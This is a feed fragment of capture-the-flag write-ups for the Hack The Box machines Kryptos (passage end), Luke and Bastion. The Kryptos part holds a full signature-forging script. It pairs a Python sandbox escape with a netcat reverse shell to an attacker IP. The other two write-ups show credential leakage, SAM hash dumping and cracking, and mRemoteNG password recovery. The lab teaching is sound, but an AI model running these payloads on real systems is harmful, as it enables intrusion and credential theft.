&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To allow more extensive tests, we download the script in local and forward port 81 on our attacker machine:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# ssh -N -f -L 81:127.0.0.1:81 rijndael@10.10.10.129
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the source code, it is possible to see that there are three APIs exposed:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;GET /&lt;/code&gt; which don’t produce valuable output;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;GET /debug&lt;/code&gt; which produces a signature from a sample expression;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;POST /eval&lt;/code&gt; which allows us to pass an expression and its signature, to evaluate the signature first and if matches, executes it.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will be our attack vector. First, we have to understand how to generate valid signatures for a given expression and second we have to find a way to execute code. By inspecting the code, it is written that the function &lt;code&gt;secure_rng(seed)&lt;/code&gt; should be secure. By Googling, we found out that the &lt;code&gt;random.getrandbits(int)&lt;/code&gt; function &lt;a href=&quot;https://docs.python.org/2/library/random.html&quot;&gt;is not good for security purposes&lt;/a&gt;. Therefore, we try to break the &lt;code&gt;secure_rng(seed)&lt;/code&gt; function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;for i in range(0,2000): 
    # Set up the keys
    seed = random.getrandbits(128)
    rand = secure_rng(seed) + 1
    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
    vk = sk.get_verifying_key()
    req_data = { 'expr': '2+2', 'sig': sign(str.encode('2+2')) }
    r = requests.post(&quot;http://127.0.0.1:81/eval&quot;, json=req_data)
    if &quot;Bad signature&quot; in r.text:
        print &quot;Seed not found yet...&quot;
    else:
        print &quot;Seed found!&quot;
        print seed
        break
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After some minutes, we get the seed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;...
Seed not found yet...
Seed not found yet...
Seed not found yet...
Seed found!
41205234917818974876430183060164741391
root@pentestbox:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have to create now a proper payload for our attack.&lt;/p&gt;

&lt;p&gt;In the source code, it is possible to see that &lt;code&gt;builtins&lt;/code&gt; are disabled. By Googling, we find out &lt;a href=&quot;https://stackoverflow.com/questions/35804961/python-eval-is-it-still-dangerous-if-i-disable-builtins-and-attribute-access&quot;&gt;how to bypass this countermeasure&lt;/a&gt; and &lt;a href=&quot;https://www.floyd.ch/?p=584&quot;&gt;how to run actual code&lt;/a&gt;. We build our payload accordingly:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('&quot; + &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.16.9 9119 &amp;gt;/tmp/f&quot; + &quot;')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So &lt;a href=&quot;./resources/kryptos/break_signature_rce.py&quot;&gt;our script&lt;/a&gt; will contain:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;seed = int(sys.argv[1])
rand = secure_rng(seed) + 1
sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
vk = sk.get_verifying_key()
expr = &quot;[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('&quot; + &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.16.9 9119 &amp;gt;/tmp/f&quot; + &quot;')&quot;
req_data = { 'expr': expr, 'sig': sign(str.encode(expr)) }
r = requests.post(&quot;http://127.0.0.1:81/eval&quot;, json=req_data)
print r.text
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we setup a netcat listener and we run finally:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# python break_signature_rce.py 41205234917818974876430183060164741391

root@pentestobx:~# nc -lnvp 9119
listening on [any] 9119 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.129] 55648
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And we got root on Kryptos!&lt;/p&gt;

&lt;h4 id=&quot;thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-&quot;&gt;Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)&lt;/h4&gt;</content><author><name>Michele Campobasso</name></author><summary type="html">USER</summary></entry><entry><title type="html">Luke - 10.10.10.137</title><link href="http://localhost:4000/2019/09/20/luke/" rel="alternate" type="text/html" title="Luke - 10.10.10.137" /><published>2019-09-20T00:00:00+02:00</published><updated>2019-09-20T00:00:00+02:00</updated><id>http://localhost:4000/2019/09/20/luke</id><content type="html" xml:base="http://localhost:4000/2019/09/20/luke/">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;

&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h2&gt;

&lt;h3 id=&quot;nmap&quot;&gt;NMAP&lt;/h3&gt;

&lt;p&gt;As usual we always start with &lt;strong&gt;Nmap&lt;/strong&gt; scanning:&lt;/p&gt;

&lt;pre&gt;root@pentestbox:~# nmap -sC -sV -oA luke 10.10.10.137

Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-20 00:13 CEST
Nmap scan report for 10.10.10.137
Host is up (0.036s latency).
Not shown: 996 closed ports
PORT STATE SERVICE VERSION
&lt;b&gt;21/tcp open ftp vsftpd 3.0.3+ (ext.1)&lt;/b&gt;
&lt;b&gt;22/tcp open ssh?&lt;/b&gt;
&lt;b&gt;80/tcp open http&lt;/b&gt;
&lt;b&gt;3000/tcp open http Node.js Express framework&lt;/b&gt;
&lt;b&gt;8000/tcp open http Ajenti http control panel&lt;/b&gt;

&lt;/pre&gt;

&lt;p&gt;It seems there is anonymoys &lt;strong&gt;ftp&lt;/strong&gt; login, so we logged in and there is only one file
available, which download tell us:&lt;/p&gt;

&lt;pre&gt; $ cat for_Chihiro.txt
Dear Chihiro !!
As you told me that you wanted to learn Web Development and Frontend, I can
give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete
them soon because of our security policies !

Derry
&lt;/pre&gt;

&lt;p&gt;So it may look like there is an hidden website or page somewhere.
So, first of all we scanned all possible files and folder over the port 80 and 3000
which look like a website over 80 port:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/luke/port_80_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And over port 3000 a simple node js api service:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/luke/port_3000_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dirbuster&quot;&gt;DirBuster&lt;/h3&gt;

&lt;p&gt;With dirbuster and big.txt wordlist we found some interesting file such as:&lt;/p&gt;

&lt;pre&gt;
File found: /config.php - 200
Dir found: /css/ - 200
File found: /css/bootstrap.min.css - 200
File found: /css/scrolling-nav.css - 200File found: /css/signin.css - 200
&lt;/pre&gt;

&lt;p&gt;Where config.php retrieved us what it looks as db credentials:&lt;/p&gt;

&lt;pre&gt;
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword =
'Zk6heYCyv6ZE9Xcg'; $db = &quot;login&quot;; $conn = new mysqli($dbHost,
$dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\n&quot;. $conn -&amp;gt;
error);
&lt;/pre&gt;

&lt;p&gt;But those credentials were incorrect for the login.php and /management login
which we found with dirb.
So we start to look at the js api service. We needed to retrieve the available api
so we used dirb again over this port:&lt;/p&gt;

&lt;pre&gt;
 $dirb http://10.10.10.137:3000 -w /usr/share/wordlists/dirb/big.txt
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Fri Sep 20 00:37:31 2019
URL_BASE: http://10.10.10.137:3000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.137:3000/ ----
+ http://10.10.10.137:3000/login (CODE:200|SIZE:13)
+ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)
+ http://10.10.10.137:3000/users (CODE:200|SIZE:56)
-----------------
END_TIME: Fri Sep 20 00:40:28 2019
DOWNLOADED: 4612 - FOUND: 3
&lt;/pre&gt;

&lt;p&gt;So we have a login api and users api.
Users api needs and authenticaton token probably supplied by the /login api.
So first we tried to login we the credentials found in the config.php file.&lt;/p&gt;

&lt;pre&gt;
$ curl --header &quot;Content-Type: application/json&quot; \
&amp;gt; --request POST \
&amp;gt; --data '{&quot;password&quot;:&quot;Zk6heYCyv6ZE9Xcg&quot;, &quot;username&quot;:&quot;admin&quot;}' \
&amp;gt; http://10.10.10.137:3000/login
{&quot;success&quot;:true,&quot;message&quot;:&quot;Authentication
successful!&quot;,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vybm
FtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTky
NzB9.NkXilej8x5JP2MOHRz3SDkgPs3AVz4YEmtg2s_H0siY&quot;}
&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Success!!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The post requests give us the access token, which we can use to query the /users
api:&lt;/p&gt;

&lt;pre&gt;
$ curl -X GET -H 'Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwi
aWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTkyNzB9.NkXilej8x5JP2
MOHRz3SDkgPs3AVz4YEmtg2s_H0siY' http://10.10.10.137:3000/users/
[{&quot;ID&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Admin&quot;,&quot;Role&quot;:&quot;Superuser&quot;},
{&quot;ID&quot;:&quot;2&quot;,&quot;name&quot;:&quot;Derry&quot;,&quot;Role&quot;:&quot;Web Admin&quot;},
{&quot;ID&quot;:&quot;3&quot;,&quot;name&quot;:&quot;Yuri&quot;,&quot;Role&quot;:&quot;Beta Tester&quot;},
{&quot;ID&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Dory&quot;,&quot;Role&quot;:&quot;Supporter&quot;}]
&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Perfect!&lt;/strong&gt; We have users now, let’s try to query one user at time:&lt;/p&gt;

&lt;pre&gt;
$ curl -X GET \
&amp;gt; -H 'Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwi
aWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTkyNzB9.NkXilej8x5JP2
MOHRz3SDkgPs3AVz4YEmtg2s_H0siY' \
&amp;gt; http://10.10.10.137:3000/users/Dory
{&quot;name&quot;:&quot;Dory&quot;,&quot;password&quot;:&quot;5y:!xa=ybfe)/QD&quot;}
{&quot;name&quot;:&quot;Derry&quot;,&quot;password&quot;:&quot;rZ86wwLvx7jUxtch&quot;}
bet@tester87
{&quot;name&quot;:&quot;Admin&quot;,&quot;password&quot;:&quot;WX5b7)&amp;gt;/rp$U)FW&quot;}
&lt;/pre&gt;

&lt;p&gt;In fact we discovered after several tries that the Derry credentials were correct
for the /management panel
And this is what looks like the management panel; we just have some files
config.php login.php which we already had:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/luke/after_login_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But now we alse have config.json file! Which looks really interesting since
seems to be something related to ajenti page, which is the login page discovered
on port 8000:
This is what login page looks like:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/luke/ajenti_login_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And this is otherwise what the config.json file shows on /management page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/luke/json_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What is immediately visible is the password field;which seems to be the admin
password for ajenti login.&lt;/p&gt;

&lt;pre&gt;&lt;b&gt;password &quot;KpMasng6S5EtTy9Z&quot;&lt;/b&gt;&lt;/pre&gt;

&lt;p&gt;So Username root and password KpMasng6S5EtTy9Z:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/luke/logged_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Logged in!!&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;root&quot;&gt;ROOT&lt;/h1&gt;

&lt;p&gt;This looks like Ajenti backend and after several google research we noticed that
there a “Terminal” options which it open a terminal with bash with the user
privileges, in our case guess what… root!!
So clicking on terminal and running a new one gave us a perfect shell with root
priv:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/luke/rooted_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From here we can also of course create a reverse shell to our host machine but
the flag is already retrieved.&lt;/p&gt;

&lt;h4 id=&quot;thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-&quot;&gt;Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)&lt;/h4&gt;</content><author><name>Andrea Melis</name></author><summary type="html">USER</summary></entry><entry><title type="html">Bastion - 10.10.10.134</title><link href="http://localhost:4000/2019/09/13/bastion/" rel="alternate" type="text/html" title="Bastion - 10.10.10.134" /><published>2019-09-13T00:00:00+02:00</published><updated>2019-09-13T00:00:00+02:00</updated><id>http://localhost:4000/2019/09/13/bastion</id><content type="html" xml:base="http://localhost:4000/2019/09/13/bastion/">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;

&lt;p&gt;The first thing we have done has been to perform an &lt;strong&gt;Nmap&lt;/strong&gt; scan against the target.&lt;/p&gt;

&lt;pre&gt;nmap -sS -sV -v -A -p- -oA nmap_tcp_all 10.10.10.134

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
| 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
49669/tcp open msrpc Microsoft Windows RPC
49670/tcp open msrpc Microsoft Windows RPC

&lt;/pre&gt;

&lt;p&gt;As it is possible to notice the only interesting ports are SMB ports. For this reason we
tried to use smbmap with guest account, through the following command :&lt;/p&gt;

&lt;p&gt;&lt;code&gt;smbmap -H 10.10.10.134 -u guest -p &quot;&quot; -R&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/initial_smb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As it is possible to observe the result is quite interesting because we can freely access to
the Backup folder of the SMB server.
Trying to download large files has revealed to be slow so we tried so we tried to mount
the smb share on our box, using the following command:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;mount //10.10.10.134/Backups ./vhd/ -o user=guest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately the command does not work properly, apparently the File System is CIFS and mount
need a further module, cifs-utils.
After having installed the module, we could access the SMB share running:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;mount //10.10.10.134/Backups ./vhd/ -o user=guest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Enumerating the share locally, we can notice a WindowsImageBackup folder, which could potentially
contain some interesting backup files. Reaching the following folder WindowsImageBackup/L4mpje-
PC/Backup 2019-02-22 124351 is possible to notice some xml and Windows Disk Image files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/tree_smbshare.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first try is to mount that image file. We need to find a tool which allows us to mount vhd image
files, because Kali doesn’t support it natively.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo apt-get install libvhdi-utils sleuthkit
vhdimount 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
/root/Documents/HTB/Bastion/smb/vhd_mount/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In this way we create a device vhd1 in the selected folder, creating a Boot-Sector for mounitng the
Windows Image Disk. At this step , simply trying to mount the device returns an error, declaring that
NTFS signature is missing.
Analysing the vhdi1 using mmls shows that the NFS partition does not start from the beginning of the
file, but from 0000000128.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/mmls.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using this information is possible to calculate the offset, which is 128*512 (sector length) = 65536.
Rewriting the commands brings to:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;mount -vt ntfs-3g -o ro,noload,offset=65536 /.vhdi1 ./backup/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And we were able to mount the partition in the backup folder. Looking at the backup, it is clear that it
contains the whole Windows OS, including the configuration files. Indeed, it is possible to access to the
folder /Windows/System32/config and have access to SYSTEM and SAM files, which are needed in
order to dump the hashes of the users.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/hashdump.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using john specifying the NT format is possible to crack the password of user L4mpje.
Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:&lt;strong&gt;bureaulampje&lt;/strong&gt;:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec9
86d9:::
Using the discovered credential over ssh allows to open a session as user L4mpje, obtaining the first
flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/user.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;root&quot;&gt;ROOT&lt;/h1&gt;

&lt;p&gt;Now we need to get superuser privileges. As first, we need to enumerate the Windows FS, searching for
interesting files. Unofrtunately the systeminfo command is denied, so I tried to access the same
information using powershell, verifying if I obtain a different result. And so it was, we were able to
identify the current OS version using Get-ComputerInfo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/windowsos.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to have a complete overview of the files and programs installed on the comuter, I also run the
Powerless [1] enumeration script. The output is present as Appendix.
Digging into the listed files, we noticed a non-standard application installed under Program Files (x86)&lt;br /&gt;
mRemoteNG.
Googling it we discovered that it is a manager for remote connections for different communications
protocols [2]. So it could likely contains usefull credentials, hopefully of the Administrator user,
granting us full control over the box. Further researching for possible ways to recovery the password, I
found an interesting article [3]. Despite it proposes three different ways in order to recover it, the only
one actually working for me is the first one, which involves installing mRemoteNG in a Windows
system.
The file which contains the credential we are searching for is under Users\L4mpje\AppData\Roaming&lt;br /&gt;
mRemoteNG\confCons.xml which contains two nodes, so probably, two encrypted credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/nodes.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After having started a Windows VM and having installed mRemoteNG on it, I modified the
confCons.xml file in order to set a blank password for opening the file and loaded it using mRemoteNG
on my VM. The file is successfully loaded and the program shows two connectins : DC and L4mpje.
Using the password lookup tool of mRemoteNg, we are able to check the credentials of both user,
finding a new password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/Capture.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Providing this as password for user Administrator over ssh opens up an ssh session, so are have finally
owned the box. We can take the last flag and say bye bye to Bastion :P&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/bastion/root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;

&lt;p&gt;[1] : https://github.com/M4ximuss/Powerless&lt;/p&gt;

&lt;p&gt;[2] : https://mremoteng.org&lt;/p&gt;

&lt;p&gt;[3] : http://hackersvanguard.com/mremoteng-insecure-password-storage/&lt;/p&gt;</content><author><name>Jacopo Cortellazzi</name></author><summary type="html">USER</summary></entry></feed>